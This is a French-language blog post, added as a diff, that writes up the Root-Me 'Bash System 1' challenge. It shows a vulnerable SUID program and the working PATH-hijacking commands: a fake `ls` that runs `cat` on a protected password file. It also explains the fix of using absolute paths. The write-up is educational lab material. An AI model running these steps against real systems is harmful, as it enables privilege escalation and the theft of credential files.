@@ -1,0 +1,88 @@
+---
+title: "Le faux `ls` qui a lu un mot de passe"
+slug: "path-hijacking-suid-fr"
+date: 2026-03-02
+lang: fr
+translationSlug: "path-hijacking-suid"
+type: journal
+category: App-Script
+difficulty: Easy
+tags: ["linux", "shell", "rootme", "ctf", "suid", "débutant"]
+platform: "Root-Me"
+excerpt: "Un binaire SUID, un chemin relatif, et un faux `ls`. Comment j'ai obtenu un mot de passe que le programme n'était pas censé partager."
+published: true
+---
+
+## Contexte
+
+Root-Me, catégorie App-Script. Le challenge me donne un binaire SUID et son code source :
+
+```c
+int main(void) {
+    setreuid(geteuid(), geteuid());
+    system("ls /challenge/app-script/ch11/.passwd");
+    return 0;
+}
+```
+
+Le binaire tourne en tant qu'`app-admin`. Il lit un fichier de mot de passe auquel je n'ai pas accès. Mon objectif : obtenir ce mot de passe.
+
+## Ce que j'ai remarqué
+
+Le programme appelle `ls` — mais pas `/bin/ls`. Juste `ls`.
+
+C'est là toute la vulnérabilité. Quand un programme appelle une commande sans chemin absolu, le shell la cherche dans `$PATH`, dans l'ordre. Le premier résultat trouvé gagne.
+
+Je contrôle `$PATH`.
+
+## Ce que j'ai fait
+
+Créer un faux `ls` dans `/tmp` :
+
+```bash
+mkdir /tmp/exploit
+echo -e '#!/bin/bash\ncat $1' > /tmp/exploit/ls
+chmod +x /tmp/exploit/ls
+```
+
+Placer `/tmp/exploit` en premier dans le PATH :
+
+```bash
+export PATH=/tmp/exploit:$PATH
+```
+
+Lancer le binaire :
+
+```bash
+./ch11
+```
+
+Le programme a appelé mon `ls`. Mon `ls` a exécuté `cat` sur le fichier de mot de passe. Avec les privilèges d'`app-admin`. Mot de passe affiché. Challenge terminé.
+
+## La partie SUID
+
+Le `s` dans `-r-sr-x---` est ce qui rend ça dangereux. SUID signifie que le binaire tourne en tant que son *propriétaire*, et non en tant que l'utilisateur qui le lance.
+
+Sans SUID, le binaire appellerait quand même mon faux `ls` — mais avec mes propres permissions. Je ne pourrais pas lire le fichier de mot de passe de toute façon. L'élévation de privilèges ne fonctionne que grâce au SUID.
+
+`setreuid(geteuid(), geteuid())` dans le code source est explicite : le programme fixe son UID réel pour correspondre à l'UID effectif (celui d'app-admin). Pas de rétrogradation. Privilèges complets pour toute la durée du processus.
+
+## Pourquoi ça compte hors CTF
+
+Ce n'est pas une astuce CTF artificielle. Dans des environnements réels, il existe des binaires SUID qui appellent des commandes sans chemin absolu. Des mauvaises configurations dans des scripts personnalisés, des logiciels hérités, des installateurs mal écrits.
+
+Si un attaquant peut écrire dans un répertoire quelconque de `$PATH` avant `/bin`, ou modifier `$PATH` dans une session où un binaire SUID est appelé, c'est terminé.
+
+Le correctif est simple : toujours utiliser des chemins absolus dans les programmes privilégiés. `/bin/ls`, pas `ls`. Un caractère de plus. La différence entre sûr et exploitable.
+
+## Ce que j'ai ressenti quand ça a marché
+
+J'ai lancé `./ch11` sans trop y croire. Le mot de passe s'est affiché.
+
+On a l'impression que le programme vous a remis les clés lui-même. C'est exactement ce qui s'est passé.
+
+## Ressources
+
+- [Root-Me — Bash System 1](https://www.root-me.org/fr/Challenges/App-Script/Bash-System-1)
+- [SUID — Wikipedia](https://en.wikipedia.org/wiki/Setuid)
+- [PATH Hijacking — HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path)
